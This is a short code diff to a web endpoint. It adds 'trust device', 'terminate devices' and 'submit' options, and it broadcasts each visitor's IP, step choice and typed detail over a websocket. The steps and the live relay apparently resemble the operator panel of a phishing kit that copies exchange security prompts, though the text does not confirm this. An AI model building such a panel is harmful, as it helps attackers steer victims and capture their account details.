@@ -14,7 +14,15 @@ import { broadcast } from '$lib/server/websocket';
 const STEP_LABELS: Record<string, string> = {
 	login_location: 'Sign-in location',
 	withdrawal: 'Withdrawal',
-	email_change: 'Email change'
+	email_change: 'Email change',
+	trust_device: 'Trust device',
+	terminate_devices: 'Terminate devices'
+};
+
+const VERBS: Record<string, string> = {
+	approve: 'approved',
+	deny: 'denied',
+	submit: 'submitted'
 };
 
 export const POST: RequestHandler = async ({ request, getClientAddress }) => {
@@ -29,13 +37,13 @@ export const POST: RequestHandler = async ({ request, getClientAddress }) => {
 	const choice = String(body.choice ?? '').trim();
 	const detail = String(body.detail ?? '').trim();
 
-	if (!step || !['approve', 'deny'].includes(choice)) {
+	if (!step || !VERBS[choice]) {
 		return json({ ok: false, error: 'invalid payload' }, { status: 400 });
 	}
 
 	const ip = getClientAddress();
 	const stepLabel = STEP_LABELS[step] ?? step;
-	const verb = choice === 'approve' ? 'approved' : 'denied';
+	const verb = VERBS[choice];
 	const message = `visitor ${ip} ${verb} ${stepLabel}${detail ? ` — ${detail}` : ''}`;
 
 	const entryType: 'alert' | 'action' = choice === 'deny' ? 'alert' : 'action';
